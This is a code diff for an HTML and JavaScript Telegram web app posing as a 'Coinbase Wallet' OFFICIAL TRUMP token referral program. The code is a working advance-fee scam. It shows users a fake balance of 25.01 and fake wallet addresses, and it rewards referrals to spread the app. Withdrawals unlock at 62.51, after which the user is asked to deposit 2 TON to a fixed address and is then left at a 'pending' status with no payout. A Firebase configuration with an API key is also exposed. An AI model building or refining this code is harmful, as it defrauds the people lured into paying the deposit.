@@ -305,6 +305,15 @@
   .trump_img{
     border-radius: 50%;
   }
+  .warning{
+      color:red;
+      font-weight: 100;
+      font-size: 0.7rem;
+      
+  }
+  .hide{
+      display: none;
+  }
 
 </style>
   
@@ -473,7 +482,7 @@
     <div class="dark-content">
       <p>Your referral link has been copied successfully!</p>
       <p>Share the link to get $2.5 per your referral!</p>
-      <p><strong style="color:red;">Note:</strong> Your widthrawal is subjected to review and verification.</p>
+      <p><strong style="color:red;">Note:</strong> Your withdrawal is subjected to review and verification.</p>
       <button class="close-btn">Close</button>
     </div>
   </div>
@@ -496,26 +505,87 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
    <!-- Dark Popup Modal 7 -->
    <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
   <div class="dark-content">
-    <p>Enter your wallet address</p>
+    <p>Enter your withdrawal details</p>
+    <p>
+      <form class="wallet-form" id="wallet-form">
+        <label for="walletInput" class="hidden-label">Wallet Address</label>
+        <input type="text" id="walletInput" placeholder="Enter Your Trump Wallet Address...">
+        <span class="text-warning warning">* Enter correct wallet details, this action is irreversible!</span>
+        
+        <label for="wallet_amountInput" class="hidden-label">Withdrawal Amount</label>
+        <input type="text" id="wallet_amountInput" placeholder="Enter Amount">
+        <span class="text-warning warning hide">* You do not have sufficient balance!</span>
+                
+        <input id="submitWalletInfo" type="submit" value="Continue">
+        
+      </form>
+    </p>
+    
+  </div>
+</div> 
+
+
+
+<!-- Dark Popup Modal 7 -->
+   <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
+  <div class="dark-content">
+    <p>Enter your withdrawal details</p>
     <p>
       <form class="wallet-form">
         <label for="wallet" class="hidden-label">Wallet Address</label>
         <input type="text" id="wallet" placeholder="Enter Your Trump Wallet Address...">
-        <input type="submit" value="Continue">
+        <span class="text-warning warning">* Enter correct wallet details, this action is irreversible!</span>
+        
+        <label for="wallet_amount" class="hidden-label">Withdrawal Amount</label>
+        <input type="text" id="wallet_amount" placeholder="Enter Amount">
+        <span class="text-warning warning hide">* You do not have sufficient balance!</span>
+                
+        <input id="submitWalletInfo" type="submit" value="Continue">
+        
       </form>
     </p>
+    
+  </div>
+</div> 
 
-    <p>Kindly copy the wallet address below, and make a deposit of $2.</p>
+
+
+   <!-- Dark Popup Modal 8 -->
+   <div id="darkModal8" class="iziModal" data-izimodal-title="Payment">
+  <div class="dark-content">
+    <p>Payment!!!</p>
+    
+
+    <p>Kindly copy the wallet address below, and make a deposit of 2 <strong class="coin-defaults">TONS</strong>.</p>
 
     <p>
       <span class="depAddr">UQC1f5...Z0HfkO8aTDy</span>
       <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
     </p>
 
-    <p><strong>Continue &raquo;</strong></p>
+    <p id="continuePayment"><strong>Continue &raquo;</strong></p>
     <button class="close-btn">Close</button>
   </div>
 </div>  
+
+
+  <!-- Dark Popup Modal 9 -->
+  <div id="darkModal9" class="iziModal" data-izimodal-title="Status - <strong>Pending</strong>">
+    <div class="dark-content">
+        <p>
+        <img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump">
+        </p>
+      <p><strong>Congratulations!!! 🎉🎉🎉</strong></p>
+
+      <p>You have already requested for a withdrawal! Kindly wait for confirmation of your payment. Your withdrawal will be automatically settled in your specified <span class="coin-defaults">TRUMP</span> wallet after verification</p>
+      
+      <p><h4>Want to earn more ?</h4></p>
+      
+      <p>Join our channel and share your referral link! </p>
+      <p style="font-style:italic; font-weight:100;">Thanks for your participation</p>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
   
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
@@ -547,7 +617,6 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
   // Update prices every 2 seconds
   setInterval(updatePrices, 2000);
 </script>
-
 
   <script>
     $(document).ready(function() {
@@ -613,13 +682,12 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
       });
     });
   </script>
+  
 <script type="module">
-  // Import Firebase SDK
   import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-analytics.js";
   import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
 
-  // Firebase configuration
   const firebaseConfig = {
     apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
     authDomain: "coinbase-tgwallet.firebaseapp.com",
@@ -628,162 +696,202 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
     storageBucket: "coinbase-tgwallet.firebasestorage.app",
     messagingSenderId: "441804145305",
     appId: "1:441804145305:web:1fb586667c0d648c342e08",
-    measurementId: "G-374F8YD4KV"
+    measurementId: "G-374F8YD4KV",
   };
 
-  // Initialize Firebase
   const app = initializeApp(firebaseConfig);
   const analytics = getAnalytics(app);
   const database = getDatabase(app);
 
-  // Initialize Telegram WebApp
   const tg = window.Telegram.WebApp;
   tg.ready();
 
-  const userId = tg.initDataUnsafe.user?.id || '54341'; // Unique Telegram user ID
+  const userId = tg.initDataUnsafe.user?.id || "54341";
   const username = tg.initDataUnsafe.user?.username || "Anonymous";
-  
-function generateRandomString(length) {
-    let result = '';
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const charactersLength = characters.length;
-    
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    
-    return result;
-}
-const randomEnding = generateRandomString(5);
-const walletAddress = `0xA1Ed...${randomEnding}`;
 
-  // Display the username in the header
+  function generateRandomString(length) {
+    let result = "";
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const charactersLength = characters.length;
+
+    for (let i = 0; i < length; i++) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+  }
+
+  const randomEnding = generateRandomString(5);
+  const walletAddress = `0xA1Ed...${randomEnding}`;
+
   document.getElementById("account-name").textContent = `@${username}`;
   document.getElementById("wallet-address").textContent = `${walletAddress}`;
 
-  // Access the startapp parameter
   const urlParams = new URLSearchParams(window.location.search);
-  const startParam = urlParams.get('tgWebAppStartParam');
-  const referrerId = startParam ? startParam.replace('ref', '') : null; // Extract referrer ID
+  const startParam = urlParams.get("tgWebAppStartParam");
+  const referrerId = startParam ? startParam.replace("ref", "") : null;
 
-  // Check if the user exists in Firebase
   const userRef = ref(database, `users/${userId}`);
   get(userRef).then((snapshot) => {
     if (!snapshot.exists()) {
-      // Create a new user entry with initial balance
       set(userRef, {
         username: username,
-        balance: 25.01, // Initial balance
+        balance: 25.01,
         referrals: 0,
         referredBy: referrerId && referrerId !== userId ? referrerId : null,
         wallet: walletAddress,
       }).then(() => {
-        // Handle referrals only if referrerId is valid and not the same as userId
         if (referrerId && referrerId !== userId) {
           const referrerRef = ref(database, `users/${referrerId}`);
           get(referrerRef).then((refSnapshot) => {
             if (refSnapshot.exists()) {
               const referrerData = refSnapshot.val();
-              // Update referrer's referrals and balance
               update(referrerRef, {
                 referrals: (referrerData.referrals || 0) + 1,
-                balance: (referrerData.balance || 0) + 2.5 // Referral bonus
+                balance: (referrerData.balance || 0) + 2.5,
               });
             }
           });
         }
       });
     } else {
-      // Handle existing user re-registration (if they were deleted and re-added)
       get(ref(database, `users`)).then((usersSnapshot) => {
         if (usersSnapshot.exists()) {
           const usersData = usersSnapshot.val();
           let totalReferred = 0;
 
-          // Check all users to see how many were referred by this user
           for (const key in usersData) {
             if (usersData[key]?.referredBy === userId) {
               totalReferred++;
             }
           }
 
-          // Update the user's referrals and balance accordingly
           update(userRef, {
             referrals: totalReferred,
-            balance: 25.01 + totalReferred * 2.5 // Initial balance + bonus for all referrals
+            balance: 25.01 + totalReferred * 2.5,
           });
         }
       });
     }
   });
 
-  // Real-time balance updates using onValue
   const balanceRef = ref(database, `users/${userId}/balance`);
-  
+  const walletAddr = ref(database, `users/${userId}/wallet`);
+
   onValue(balanceRef, (snapshot) => {
     const balance = parseFloat(snapshot.val());
-    
-    document.querySelector('.balance-section h2').textContent = `$${balance.toFixed(2)}`;
-    
-
-// Set the balance to cookie
-  
-  document.cookie = `userBalance=${balance.toFixed(2)}; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-  
+    document.querySelector(".balance-section h2").textContent = `$${balance.toFixed(2)}`;
+    document.cookie = `userBalance=${balance.toFixed(2)}; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
   });
-  
- //🔥🔥🔥🔥🔥
-    const userBalanceCookie = document.cookie.split('; ').find(row => row.startsWith('userBalance='));
-const userBalance = userBalanceCookie ? parseFloat(userBalanceCookie.split('=')[1]) : null;
 
-if (userBalance >= 62.51) {
-   
-    $(".open-withdraw").on("click", function() {
-        $("#darkModal7").iziModal("open");
-      });
-       
-} else {
-$(".open-withdraw").on("click", function() {
-    $("#darkModal2").iziModal("open");
-    });
-}
-
-  
-  const walletAddr = ref(database, `users/${userId}/wallet`);
-  
   onValue(walletAddr, (snapshot) => {
-  
     const wallet = snapshot.val() || walletAddress;
-    
-document.getElementById('wallet-address').textContent = wallet;
-
+    document.getElementById("wallet-address").textContent = wallet;
   });
-  
 
-  // Share button functionality
-  const shareButton = document.getElementById('share-button');
-  const referralLink = `https://t.me/CoinbaseSendBot/CoinbaseWallet?startapp=ref${userId}`;
+  $(".open-withdraw").on("click", function () {
+    const userBalanceCookie = document.cookie.split("; ").find((row) => row.startsWith("userBalance="));
+    const userBalance = userBalanceCookie ? parseFloat(userBalanceCookie.split("=")[1]) : null;
 
-  shareButton.addEventListener('click', () => {
-    // Copy referral link to clipboard
-    const tempInput = document.createElement('input');
-    tempInput.value = referralLink;
-    tempInput.style.position = 'absolute';
-    tempInput.style.left = '-9999px';
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand('copy');
-    document.body.removeChild(tempInput);
+    const userWithdrawalCookie = document.cookie.split("; ").find((row) => row.startsWith("userWithrawal="));
+    const userWithdrawal = userWithdrawalCookie ? userWithdrawalCookie.split("=")[1] : null;
 
-    // Display a Toast notification
-    iziToast.success({
-      title: "Copied!",
-      message: "Referral link copied to clipboard!",
-      duration: 3000,
-      position: "topRight",
+    const userPaidCookie = document.cookie.split("; ").find((row) => row.startsWith("userPaid="));
+    const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
+
+    if (userBalance >= 62.51) {
+      if (userWithdrawal === "pending" && (!userPaid || userPaid !== "paid")) {
+        $("#darkModal8").iziModal("open");
+      } else if (userWithdrawal === "pending" && userPaid === "paid") {
+        $("#darkModal9").iziModal("open");
+      } else {
+        $("#darkModal7").iziModal("open");
+      }
+    } else {
+      $("#darkModal2").iziModal("open");
+    }
+  });
+
+  $(document).ready(function () {
+    $("#continuePayment").on("click", function () {
+      $("#darkModal9").iziModal("open");
+      document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
     });
+
+    $("#wallet-form").on("submit", function (e) {
+      e.preventDefault();
+
+      const wallet = $("#walletInput").val().trim();
+      const amount = parseFloat($("#wallet_amountInput").val().trim());
+
+      if (!wallet || isNaN(amount) || amount <= 0) {
+        showError("Please enter a valid wallet address and amount!");
+        return;
+      }
+
+      const balanceRef = ref(database, `users/${userId}/balance`);
+      toggleSubmitButton(true, "Processing");
+
+      get(balanceRef)
+        .then((snapshot) => {
+          if (snapshot.exists()) {
+            const currentBalance = parseFloat(snapshot.val());
+            if (amount > currentBalance) {
+              showError("You do not have sufficient balance!");
+              return;
+            }
+            submitWithdrawal(userId, wallet, amount);
+          } else {
+            showError("Failed to fetch balance. Please try again!");
+          }
+        })
+        .catch(() => {
+          showError("An error occurred while retrieving your balance.");
+        })
+        .finally(() => {
+          toggleSubmitButton(false, "Continue");
+        });
+    });
+
+    function showError(message) {
+      iziToast.error({ title: "Error", message, position: "topRight" });
+    }
+
+    function toggleSubmitButton(disabled, text) {
+      $("#submitWalletInfo").prop("disabled", disabled).text(text);
+      if (disabled) {
+        $("<i>", { class: "far fa-spinner fa-spin" }).appendTo("#submitWalletInfo");
+      } else {
+        $("#submitWalletInfo .fa-spinner").remove();
+      }
+    }
+
+    function submitWithdrawal(userId, wallet, amount) {
+      const withdrawalRef = ref(database, `users/${userId}/withdrawals`);
+      const withdrawalId = Date.now();
+
+      set(ref(withdrawalRef, withdrawalId), {
+        wallet,
+        amount,
+        status: "pending",
+        timestamp: new Date().toISOString(),
+      })
+        .then(() => {
+          document.cookie = `userWidrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+          iziToast.success({
+            title: "Success",
+            message: "Withdrawal request submitted successfully!",
+            position: "topRight",
+          });
+          $("#darkModal7").iziModal("close");
+          $("#darkModal8").iziModal("open");
+        })
+        .catch(() => {
+          showError("Failed to submit withdrawal request. Please try again!");
+        });
+    }
   });
 </script>
+
 
 </body>
 </html>
